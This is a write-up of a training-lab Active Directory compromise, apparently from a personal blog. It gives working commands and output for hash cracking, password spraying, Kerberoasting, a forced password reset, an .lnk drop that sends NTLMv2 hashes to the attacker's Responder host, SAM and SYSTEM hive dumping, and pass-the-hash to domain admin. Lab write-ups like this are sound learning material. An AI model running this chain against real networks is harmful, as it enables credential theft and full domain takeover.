---
layout: post
title: "HackSmarter BuildingMagic Writeup"
date: 2026-09-25
categories: HackSmarter
tags: [hacksmarter, writeup, active-directory]
---

Technical writeup for the HackSmarter BuildingMagic Active Directory lab - here: https://courses.hacksmarter.org/dashboard

## Scope & Initial Info

We're given the objective to fully compromise the `BUILDINGMAGIC.LOCAL` AD environment. As a starting point we're handed a leaked internal database dump containing employee usernames and their MD5-hashed passwords:

```
id  username         full_name              role            password
1   r.widdleton      Ron Widdleton          Intern Builder  c4a21c4d438819d73d24851e7966229c
2   n.bottomsworth   Neville Bottomsworth   Planner         61ee643c5043eadbcdc6c9d1e3ebd298
3   l.layman         Luna Layman            Planner         8960516f904051176cc5ef67869de88f
4   c.smith          Chen Smith             Builder         bbd151e24516a48790b2cd5845e7f148
5   d.thomas         Dean Thomas            Builder         4d14ff3e264f6a9891aa6cea1cfa17cb
6   s.winnigan       Samuel Winnigan        HR Manager      078576a0569f4e0b758aedf650cb6d9a
7   p.jackson        Parvati Jackson        Shift Lead      eada74b2fa7f5e142ac412d767831b54
8   b.builder        Bob Builder            Electrician     dd4137bab3b52b55f99f18b7cd595448
9   t.ren            Theodore Ren           Safety Officer  bfaf794a81438488e57ee3954c27cd75
10  e.macmillan      Ernest Macmillan       Surveyor        47d23284395f618bea1959e710bc68ef
```

First things first, add the DC to `/etc/hosts`:

```
echo "10.1.28.162 buildingmagic.local dc01.buildingmagic.local" >> /etc/hosts
```

## Cracking Initial Hashes

MD5 without a salt is notoriously weak. I threw the hashes at crackstation and also ran hashcat locally:

```
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Two hashes crack:
- `r.widdleton` → `lilronron`
- `t.ren` → `shadowhex7`

I sprayed both against SMB with NXC to see what sticks:

```
nxc smb 10.1.28.162 -u usernames.txt -p passwords.txt --continue-on-success
```

`r.widdleton:lilronron` validates. `t.ren:shadowhex7` doesn't - the account either has a different domain password or is disabled. Doesn't matter, we have a foothold.

## AD Enumeration

Validate the creds and check shares:

```
nxc smb 10.1.28.162 -u 'r.widdleton' -p 'lilronron' --shares
```

```
SMB  10.1.28.162  445  DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron
SMB  10.1.28.162  445  DC01  Share           Permissions     Remark
SMB  10.1.28.162  445  DC01  -----           -----------     ------
SMB  10.1.28.162  445  DC01  ADMIN$                          Remote Admin
SMB  10.1.28.162  445  DC01  C$                              Default share
SMB  10.1.28.162  445  DC01  File-Share                      Central Repository of Building Magic's files.
SMB  10.1.28.162  445  DC01  IPC$            READ            Remote IPC
SMB  10.1.28.162  445  DC01  NETLOGON                        Logon server share
SMB  10.1.28.162  445  DC01  SYSVOL                          Logon server share
```

Read-only access, nothing juicy yet. Time to pull AD data into BloodHound:

```
nxc ldap 10.1.28.162 -u 'r.widdleton' -p 'lilronron' --bloodhound --collection All --dns-server 10.1.28.162
```

## BloodHound Analysis & Kerberoasting

Loading the data into BloodHound, I searched for kerberoastable users and found `r.haggard` - they have an SPN set, making them a target.

```
nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --kerberoast output.txt
```

```
LDAP  10.1.28.162  389  DC01  [*] Total of records returned 1
LDAP  10.1.28.162  389  DC01  [*] sAMAccountName: r.haggard
LDAP  10.1.28.162  389  DC01  $krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$...
```

Crack the TGS ticket with hashcat (mode 13100 = Kerberos TGS-REP etype 23):

```
hashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt
```

```
$krb5tgs$23$...:rubeushagrid

Status...........: Cracked
Time.Started.....: (5 secs)
```

`r.haggard:rubeushagrid` - cracked in 5 seconds, not exactly a strong password.

## ACL Abuse - ForceChangePassword

Back in BloodHound, checking `r.haggard`'s outbound object control, they have **ForceChangePassword** rights over `H.Potch`. This means we can change H.Potch's password without knowing their current one.

```
net rpc password H.Potch 'NewP@ssword123!' -U buildingmagic.local/r.haggard%'rubeushagrid' -S '10.1.28.162'
```

Validate the new creds:

```
nxc smb 10.1.28.162 -u 'H.Potch' -p 'NewP@ssword123!' --shares
```

```
SMB  10.1.28.162  445  DC01  [+] BUILDINGMAGIC.LOCAL\H.Potch:NewP@ssword123!
SMB  10.1.28.162  445  DC01  File-Share      READ,WRITE
```

Now we have write access to File-Share.

## LLMNR Poisoning / NTLMv2 Capture with Slinky

With write access to a share, we can use NXC's **slinky** module to drop a malicious `.lnk` file. When any user browses the share, their machine automatically tries to authenticate to our server, handing us their NTLMv2 hash.

Start Responder to capture the incoming auth:

```
responder -I tun0 -wv
```

Then plant the slinky:

```
nxc smb buildingmagic.local -u H.Potch -p NewP@ssword123! -M slinky -o SERVER=10.200.97.254 SHARES=File-Share NAME=HackSmarter
```

Shortly after, Responder catches a connection:

```
[SMB] NTLMv2-SSP Username : BUILDINGMAGIC\h.grangon
[SMB] NTLMv2-SSP Hash     : h.grangon::BUILDINGMAGIC:2e892b8635e20f7f:B742...
```

Crack it:

```
hashcat grangon-hash.txt /usr/share/wordlists/rockyou.txt
```

```
h.grangon::BUILDINGMAGIC:...:magic4ever
```

`h.grangon:magic4ever`

## Shell via WinRM

BloodHound shows `h.grangon` is a member of **Remote Management Users**, which means WinRM access:

```
evil-winrm -u h.grangon -p 'magic4ever' -i dc01.buildingmagic.local
```

```
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\h.grangon\Documents>
```

We're in.

I forgot to mention, the user flag is can be found at this step, but I forgot to document it!

## Dumping SAM & SYSTEM

In order to find out what to do next, I try:

```
whoami /priv
```

This reveals that `h.grangon` has `SeDebugPrivilege`, which means we can dump the SAM and SYSTEM hives to extract the local administrator NTLM hash.

From the shell, save the SAM and SYSTEM registry hives:

```
*Evil-WinRM* PS C:\> reg save HKLM\SAM SAM
*Evil-WinRM* PS C:\> reg save HKLM\SYSTEM SYSTEM
```

Download them back to Kali:

```
download SAM
download SYSTEM
```

Then extract the NT hashes locally with secretsdump:

```
impacket-secretsdump -sam SAM -system SYSTEM local
```

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Administrator NTLM hash: `520126a03f5d5a8d836f1c4f34ede7ce`

## Pass-the-Hash

Try the built-in administrator account over WinRM first:

```
evil-winrm -u "administrator" -H '520126a03f5d5a8d836f1c4f34ede7ce' -i dc01.buildingmagic.local
```

```
Error: WinRM::WinRMAuthorizationError
```

Nope - WinRM is often restricted for the built-in admin. Back to BloodHound - `a.flatch` shows up as the actual domain admin account, and they share the same local administrator NTLM (password reuse across accounts):

```
evil-winrm -u "a.flatch" -H '520126a03f5d5a8d836f1c4f34ede7ce' -i dc01.buildingmagic.local
```

```
*Evil-WinRM* PS C:\Users\a.flatch\Documents>
```

Checking privs:

```
whoami /priv
```

Full domain admin privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeImpersonatePrivilege` - everything enabled.

## Root Flag

```
*Evil-WinRM* PS C:\Users\a.flatch\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
************* (flag redacted for writeup)
```

## Summary

The full chain:

1. Leaked DB → crack MD5 hashes → `r.widdleton:lilronron`
2. BloodHound enumeration via LDAP
3. Kerberoast `r.haggard` → crack TGS → `rubeushagrid`
4. ForceChangePassword ACL → reset `H.Potch`'s password
5. Slinky + Responder → capture `h.grangon` NTLMv2 → crack → `magic4ever`
6. WinRM shell as `h.grangon`
7. Dump SAM/SYSTEM → extract local admin NTLM
8. Pass-the-Hash as `a.flatch` (domain admin)
9. Read root flag

This is some of my first experience in an AD environment, and I would highly reccomend HackSmarter to anyone trying to learn more about AD hacking/environments.

Thank you for reading!
